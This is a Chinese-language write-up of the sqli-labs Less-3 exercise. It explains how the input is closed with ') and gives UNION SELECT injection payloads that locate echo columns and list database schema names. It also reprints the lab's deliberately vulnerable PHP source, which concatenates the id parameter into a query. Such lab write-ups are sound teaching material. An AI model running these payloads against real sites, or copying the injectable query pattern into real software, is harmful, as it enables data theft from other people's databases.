# Less-3 **GET Error Based-String(with Twist)**
TAG：GET注入、字符型注入  
## 漏洞利用
此less展示了略有变形的字符型注入  
当在参数后加上单引号'进行测试时，出现如下报错信息  
![less3_1](images\less3_1.png)  
通过报错信息可知，参数的包裹方式发生了变化，现在需要构造这样的语句:```?id=1')```来进行参数的闭合  
在less3中，只是参数的闭合方式发生了改变，恶意语句的构造与less1相似  

探测回显点payload:```?id=0') union select 1,2,3--+```  
![less3_2](images\less3_2.png)  
获得数据库名信息payload:```?id=0') union select 1,2,group_concat(schema_name)from(information_schema.schemata)--+ ```   
![less3_3](images\less3_3.png)  

## 源码分析
### less3源码  
```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-3 Error Based- String (with Twist) </title>

</head>

<body bgcolor="#000000">

<div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo "<font size='5' color= '#99FF00'>";
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysql_error());
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>


</font> </div></br></br></br><center>
<img src="../images/Less-3.jpg" /></center>
</body>
</html>
```  
## 漏洞点分析  
```
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
$result=mysql_query($sql);
```  
此页面的漏洞原因和less1相似，只是参数的包裹方式发生了变化  
在此less中，参数id被括号()和单引号'包裹，要进行恶意语句的插入需先对单引号和括号进行闭合，其余并无太多变化即可进行注入  